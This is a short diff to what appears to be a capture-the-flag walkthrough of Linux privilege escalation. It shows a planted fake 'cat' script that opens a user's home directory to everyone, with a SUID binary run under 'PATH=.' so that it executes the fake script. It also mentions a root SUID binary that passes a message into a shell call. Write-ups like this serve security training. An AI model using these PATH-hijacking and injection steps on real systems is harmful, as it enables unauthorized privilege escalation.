@@ -55,7 +55,7 @@ mysql> select * from users;
 $ cat > cat <<EOF
 /bin/chmod -R o+rwx /home/mike
 EOF
-$ ./msgmike
+$ PATH=. ./msgmike
 
 14) Run root suid binary (r2 show that binary do a system call on "/bin/echo %s >> /root/messages.txt" where %s is the message) :
 $ /home/mike/msg2root
